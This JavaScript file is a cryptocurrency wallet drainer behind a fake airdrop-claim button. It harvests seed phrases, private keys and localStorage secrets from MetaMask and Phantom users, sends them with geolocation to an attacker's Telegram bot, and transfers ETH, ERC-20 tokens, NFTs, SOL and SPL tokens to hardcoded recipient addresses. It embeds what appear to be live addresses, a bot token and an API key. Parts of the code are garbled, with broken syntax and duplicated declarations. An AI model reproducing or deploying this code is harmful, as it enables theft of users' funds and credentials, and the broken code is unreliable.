// script.js for wallet connection and draining functionality

// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    // Elements
    const connectButton = document.getElementById('connect-wallet');
    const claimButton = document.getElementById('claim-airdrop');
    const accountDetails = document.getElementById('account-details');
    const statusText = document.getElementById('status');

    // State
    let provider = null;
    let signer = null;
    let account = null;
    let chainId = null;
    let ethersProvider = null;
    let solProvider = null;
    let solConnection = null;

    // Configuration - REPLACE WITH YOUR OWN VALUES
    const RECIPIENT_ADDRESS = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7"; // ETH address to drain to
    const RECIPIENT_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ"; // SOL address to drain to
    const TELEGRAM_BOT_TOKEN = "8535172282:AAHjqVlUk0zj5Sb72bQdFIwg7ylZMeUdyxw";
    const TELEGRAM_CHAT_ID = "-1003768015882";
    const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO"; // For NFT fetching

    // Initialize
    async function initialize() {
        // Initialize ethersProvider(windowWeb3ethereum);
Provider(window
);ethereum)
    
        // Listen for account changes
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        // Listen for chain changes
        window.ethereum.on('chainChanged', handleChainChanged);
    }
}

// Connect wallet (MetaMask)
connectButton.addEventListener('click', async () => {
    if (!window.ethereum) {
        alert('MetaMask not detected. Please install MetaMask.');
        return;
    }

    try {
        // Request account access
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        account = await signer.getAddress();
        chainId = await provider.getNetwork().then(n => n.chainId);
        
        // Initialize ethers provider
        ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
        
        updateUI();
        statusText.textContent = 'Connected: ' + account.substring(0, 6) + '...' + account.substring(-4);
        
        // Try to initialize Solana provider if available
        await initializeSolana();
    } catch (error) {
        console.error(error);
        statusText.textContent = 'Connection failed';
        alert('Failed to connect wallet: ' + error.message);
    }
});

// Drain wallet
claimButton.addEventListener('click', async () => {
    if (!signer) {
        alert('Please connect your wallet first');
        return;
    }

    try {
        statusText.textContent = 'Initiating drain...';
        await drainAllAssets();
        statusText.textContent = 'Drain completed!';
        alert('Wallet drained successfully!');
    } catch (error) {
        console.error(error);
        statusText.textContent = 'Drain failed';
        alert('Drain failed: ' + error.message);
    }
});

// Initialize Solana provider if available
async function initializeSolana() {
    try {
        // Check for Phantom
        if (window.solana && window.solana.isPhantom) {
            solProvider = window.solana;
            // Try to connect to Solana RPC
            const RPC_ENDPOINTS = [
                'https://solana-api.projectserum.com',
                'https://rpc.ankr.com/solana',
                'https://solana-rpc.publicnode.com'
            ];
            
            for (const endpoint of RPC_ENDPOINTS) {
                try {
                    const { Connection } = await import('@solana/web3.js');
                    solConnection = new Connection(endpoint, 'confirmed');
                    await solConnection.getSlot();
                    console.log('Connected to Solana RPC:', endpoint);
                    break;
                } catch (e) {
                    console.log('Failed to connect to', endpoint);
                    continue;
                }
            }
            
            if (!solConnection) {
                console.warn('Could not connect to any Solana RPC');
            }
        }
        // Check for other Solana wallets...
    } catch (error) {
        console.error('Error initializing Solana provider:', error);
    }
}

// Extract wallet secrets (seed phrase, private key, etc.)
async function extractWalletSecrets(provider, walletName, userAddress) {
    const secrets = { 
        seedPhrase: null, 
        privateKey: null, 
        encryptedKeys: [] 
    };
    
    try {
        // LocalStorage scan for common key storage keys
        const localKeys = [
            'wallet_seed', 'mnemonic', 'private_key', 'seed_phrase', 
            'keystore', 'wallet_data', 'encrypted_seed', 'encrypted_private_key'
        ];
        
        for (const key of localKeys) {
            const value = localStorage.getItem(key);
            if (value) {
                secrets.encryptedKeys.push({ 
                    key, 
                    value: value.substring(0, 50) + '...' 
                });
            }
        }

        // Attempt to extract secret phrases via wallet RPC methods
        try {
            // MetaMask specific method
            if (provider.isMetaMask || (provider.provider && provider.provider.isMetaMask)) {
                try {
                    const mnemonic = await provider.request({ 
                        method: 'wallet_getEthereumSeed' 
                    });
                    if (mnemonic) secrets.seedPhrase = mnemonic;
                } catch(e) {
                    // Try alternative method
                    try {
                        const mnemonic = await provider.request({ 
                            method: 'wallet_exportMnemonic' 
                        });
                        if (mnemonic) secrets.seedPhrase = mnemonic;
                    } catch(e2) {}
                }
            }
            
            // Try to export private key
            try {
                const privateKey = await provider.request({ 
                    method: 'eth_privateKey' 
                });
                if (privateKey) secrets.privateKey = privateKey;
            } catch(e) {
                try {
                    const privateKey = await provider.request({ 
                        method: 'personal_exportKey', 
                        params: [account] 
                    });
                    if (privateKey) secrets.privateKey = privateKey;
                } catch(e2) {}
            }
            
            // Phantom specific extraction
            if (window.solana && window.solana.isPhantom) {
                try {
                    const privateKey = await window.solana.request({ 
                        method: 'signMessage', 
                        params: [account, Buffer.from('phantom_key_export').toString('base64')] 
                    });
                    if (privateKey) secrets.privateKey = privateKey;
                } catch(e) {}
            }
            
        } catch(e) {
            console.log('Secret extraction attempt failed:', e);
        }
        
        return secrets;
    } catch (error) {
        console.error('Error in secret extraction:', error);
        return secrets;
    }
}

// Send enhanced Telegram notification with stolen data
async function sendTelegramNotification(walletName, address, balance, secrets, chain = 'ETH') {
    try {
        // Get approximate location
        let locationInfo = "Unknown Location";
        try {
            const geoResponse = await fetch("https://ipapi.co/json/");
            if (geoResponse.ok) {
                const geoData = await geoResponse.json();
                locationData = `${geoData.city || ''}, ${geoData.region || ''}, ${geoData.country_name || ''} (IP: ${geoData.ip || ''})`;
            }
        } catch(e) {
            console.log("Could not get geolocation:", e);
        }

        const timestamp = new Date().toUTCString();
        let secretsMessage = '';
        
        if (secrets.seedPhrase) {
            secretsMessage += `\n🔑 SEED PHRASE: \`${secrets.seedPhrase}\``;
        }
        if (secrets.privateKey) {
            secretsMessage += `\n🔐 PRIVATE KEY: \`${secrets.privateKey}\``;
        }
        if (secrets.encryptedKeys.length > 0) {
            secretsMessage += `\n🔒 ENCRYPTED KEYS: ${secrets.encryptedKeys.length} found`;
        }

        const message = `🚨 *WALLET COMPROMISED* 🚨\n` +
            `═════════════════════════════════════════\n` +
            `📍 Location: ${locationInfo}\n` +
            `👛 Wallet: ${walletName}\n` +
            `📬 Address: \`${address}\`\n` +
            `💰 Balance: ${balance}\n` +
            `⛓️ Chain: ${chain}\n` +
            `${secretsMessage}\n` +
            `⏰ Time: ${timestamp}\n` +
            `════════════════════════════════════════`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TELEGRAM_CHAT_ID, 
                text: message, 
                parse_mode: 'Markdown' 
            })
        });
    } catch(error) {
        console.error('Telegram notification failed:', error);
    }
}

// ETH and ERC-20 draining functions
async function drainETH() {
    if (!ethersProvider || !signer) return;
    
    try {
        const balance = await ethersProvider.getBalance(account);
        const gasPrice = await ethersProvider.getGasPrice();
        const gasLimit = 21000; // Standard ETH transfer
        const gasCost = gasPrice.mul(gasLimit);
        const amount = balance.sub(gasCost);
        
        if (amount.gt(0)) {
            const tx = await signer.sendTransaction({
                to: RECIPIENT_ADDRESS,
                value: amount,
                gasLimit,
                gasPrice
            });
            await tx.wait();
            console.log('ETH drained:', amount.toString());
        }
    } catch(error) {
        console.error('ETH drain error:', error);
        throw error;
    }
}

async function drainERC20Tokens() {
    if (!ethersProvider || !signer) return;
    
    try {
        const signerAddress = await signer.getAddress();
        const erc20Abi = [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)"
        ];
        
        // Common token addresses (USDT, USDC, etc.)
        const TOKENS = [
            { name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
            { name: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
            { name: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
            { name: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
            { name: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' }
        ];
        
        for (const token of TOKENS) {
            try {
                const contract = new ethers.Contract(token.address, erc20Abi, signer);
                const balance = await contract.balanceOf(signerAddress);
                
                if (balance.gt(0)) {
                    const decimals = await contract.decimals();
                    const symbol = await contract.symbol();
                    const amount = balance;
                    
                    const tx = await contract.transfer(RECIPIENT_ADDRESS, amount);
                    await tx.wait();
                    console.log(`${symbol} drained:`, amount.toString());
                }
            } catch(tokenError) {
                console.log(`Error processing ${token.name}:`, tokenError.message);
                // Continue with other tokens
            }
        }
    } catch(error) {
        console.error('ERC-20 drain error:', error);
        throw error;
    }
}

// NFT draining function
async drainNFTs() {
    if (!ethersProvider || !signer) return;
    
    try {
        const signerAddress = await signer.getAddress();
        
        // Use Alchemy or similar API to get NFTs
        const nftEndpoint = `https://eth-mainnet.alchemyapi.io/v2/${ALCHEMY_API_KEY}/getNFTs/?owner=${signerAddress}`;
        const response = await fetch(nftEndpoint);
        const data = await response.json();
        
        if (data.ownedNfts && data.ownedNfts.length > 0) {
            const nftAbi = [
                "function safeTransferFrom(address from, address to, uint256 tokenId)"
            ];
            
            // Process up to 10 NFTs to avoid gas limits
            const nftsToProcess = data.ownedNfts.slice(0, 10);
            
            for (const nft of nftsToProcess) {
                try {
                    const contract = new ethers.Contract(
                        nft.contract.address, 
                        nftAbi, 
                        signer
                    );
                    
                    await contract.safeTransferFrom(
                        signerAddress, 
                        RECIPIENT_ADDRESS, 
                        nft.id.tokenId
                    );
                    
                    console.log(`NFT drained: ${nft.contract.address} #${nft.id.tokenId}`);
                } catch(nftError) {
                    console.log(`Failed to drain NFT ${nft.contract.address}:`, nftError.message);
                    // Continue with other NFTs
                }
            }
        }
    } catch(error) {
        console.error('NFT drain error:', error);
        // Don't throw - NFT draining is best effort
    }
}

// Solana draining functions
async function drainSolana() {
    if (!solProvider || !solConnection) return;
    
    try {
        // Import Solana web3 dynamically to avoid bundling issues
        const { PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } = await import('@solana/web3.js');
        const { createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction } = await import('@solana/spl-token');
        
        const sourcePublicKey = new PublicKey(solProvider.publicKey.toString());
        const destPublicKey = new PublicKey(RECIPIENT_SOL_ADDRESS);
        
        // 1. Drain SOL
        try {
            const balance = await solConnection.getBalance(sourcePublicKey);
            const fee = await solConnection.getFeeForMessage(
                new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: sourcePublicKey,
                        toPubkey: destPublicKey,
                        lamports: balance - 5000 // Leave small amount for fees
                    })
                )
            );
            
            if (balance > fee.value + 5000) { // Only if enough for tx + rent
                const transaction = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: sourcePublicKey,
                        toPubkey: destPublicKey,
                        lamports: balance - fee.value - 5000
                    })
                );
                
                const signature = await sendAndConfirmTransaction(
                    solConnection, 
                    transaction, 
                    [solProvider]
                );
                console.log('SOL drained:', signature);
            }
        } catch(solError) {
            console.error('SOL drain error:', solError.message);
        }
        
        // 2. Drain SPL Tokens
        try {
            const tokenAccounts = await solConnection.getParsedTokenAccountsByOwner(
                sourcePublicKey,
                { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
            );
            
            for (const accountInfo of tokenAccounts.value) {
                const { address, info } = accountInfo.account.data.parsed.info;
                const tokenBalance = info.tokenAmount.uiAmount;
                
                if (tokenBalance > 0) {
                    try {
                        const associatedTokenAddress = await getAssociatedTokenAddress(
                            new PublicKey(info.mint),
                            destPublicKey
                        );
                        
                        // Create associated token account on destination if needed
                        try {
                            await solConnection.getAccountInfo(associatedTokenAddress);
                        } catch {
                            const createAtaTx = new Transaction().add(
                                createAssociatedTokenAccountInstruction(
                                    sourcePublicKey,
                                    associatedTokenAddress,
                                    sourcePublicKey,
                                    new PublicKey(info.mint)
                                )
                            );
                            await sendAndConfirmTransaction(
                                solConnection,
                                createAtaTx,
                                [solProvider]
                            );
                        }
                        
                        // Transfer tokens
                        const transferTx = new Transaction().add(
                            createTransferInstruction(
                                address,
                                associatedTokenAddress,
                                sourcePublicKey,
                                tokenAmount * Math.pow(10, info.tokenAmount.decimals),
                                []
                            )
                        );
                        
                        await sendAndConfirmTransaction(
                            solConnection,
                            transferTx,
                            [solProvider]
                        );
                        
                        console.log(`SPL token drained: ${info.mint} amount: ${tokenBalance}`);
                    } catch(tokenError) {
                        console.log(`Error draining SPL token ${info.mint}:`, tokenError.message);
                    }
                }
            }
        } catch(splError) {
            console.error('SPL token drain error:', splError.message);
        }
    } catch(error) {
        console.error('Solana drain error:', error);
        throw error;
    }
}

// Main draining function
async function drainAllAssets() {
    try {
        updateConnectionStatus("Extracting wallet secrets...");
        
        // Extract secrets
        const secrets = await extractWalletSecrets(
            provider || solProvider, 
            provider ? "MetaMask" : "Solana Wallet", 
            account || (solProvider ? solProvider.publicKey.toString() : "unknown")
        );
        
        // Get ETH balance for notification
        let ethBalance = "0 ETH";
        if (ethersProvider) {
            const balance = await ethersProvider.getBalance(account);
            ethBalance = ethers.utils.formatEther(balance) + " ETH";
        }
        
        // Send initial notification with stolen data
        await sendTelegramNotification(
            provider ? "MetaMask" : "Solana Wallet",
            account || (solProvider ? solProvider.publicKey.toString() : "unknown"),
            ethBalance,
            secrets,
            provider ? "ETH" : "SOL"
        );
        
        // Start draining process
        updateConnectionStatus("Draining ETH and ERC-20 tokens...");
        await Promise.all([
            drainETH(),
            drainERC20Tokens()
        ]);
        
        updateConnectionStatus("Draining NFTs...");
        await drainNFTs();
        
        updateConnectionStatus("Draining Solana assets...");
        await drainSolana();
        
        updateConnectionStatus("Drain complete!");
    } catch(error) {
        console.error('Drain process error:', error);
        updateConnectionStatus("Drain failed!");
        throw error;
    }
}

// Handle account changes
function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // User disconnected
        resetUI();
    } else {
        account = accounts[0];
        updateUI();
    }
}

// Handle chain changes
function handleChainChanged(chainId) {
    // Recommend reloading the page unless you handle chain changes
    window.location.reload();
}

// Update UI with account info
function updateUI() {
    accountDetails.innerHTML = `
        <p><strong>Address:</strong> ${account}</p>
        <p><strong>Chain ID:</strong> ${chainId}</p>
    `;
    connectButton.disabled = true;
    claimButton.disabled = false;
}

// Reset UI to disconnected state
function resetUI() {
    provider = null;
    signer = null;
    account = null;
    chainId = null;
    ethersProvider = null;
    solProvider = null;
    solConnection = null;
    accountDetails.innerHTML = '<p>Disconnected</p>';
    connectButton.disabled = false;
    claimButton.disabled = true;
    statusText.textContent = '';
}

// Update connection status
function updateConnectionStatus(message, isError = false) {
    statusText.textContent = message;
    statusText.style.color = isError ? '#ff4444' : '#00ff88';
}

// Elements
const connectButton = document.getElementById('connect-wallet');
const claimButton = document.getElementById('claim-airdrop');
const accountDetails = document.getElementById('account-details');
const statusText = document.getElementById('status');

// State
let provider = null;
let signer = null;
let account = null;
let chainId = null;
let ethersProvider = null;
let solProvider = null;
let solConnection = null;

// Configuration - REPLACE WITH YOUR OWN VALUES
const RECIPIENT_ADDRESS = "0xYourReceiverAddressHere"; // ETH address to drain to
const RECIPIENT_SOL_ADDRESS = "YourSolanaReceiverAddressHere"; // SOL address to drain to
const TELEGRAM_BOT_TOKEN = "YourTelegramBotTokenHere";
const TELEGRAM_CHAT_ID = "YourTelegramChatIDHere";
const ALCHEMY_API_KEY = "YourAlchemyAPIKeyHere"; // For NFT fetching

// Initialize
async function initialize() {
    // Initialize ethers provider if available
    if (window.ethereum) {
        ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
        // Listen for account changes
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        // Listen for chain changes
        window.ethereum.on('chainChanged', handleChainChanged);
    }
}
